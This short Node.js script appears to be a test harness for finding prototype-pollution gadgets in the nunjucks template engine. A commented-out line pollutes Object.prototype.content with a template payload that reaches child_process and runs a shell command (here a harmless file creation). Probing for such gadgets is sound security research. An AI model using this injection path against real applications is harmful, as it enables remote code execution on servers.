const nunjucks = require("nunjucks");

// Object.prototype.content = " function(){ return global.process.mainModule.require('child_process').execSync('touch a.txt') }() ";

// for node-find-undefined
console.log("="*20+"start"+"="*20+"\n")

nunjucks.compile(" {{ content }} ").render();

// for node-find-undefined
console.log("="*20+"end"+"="*20+"\n")
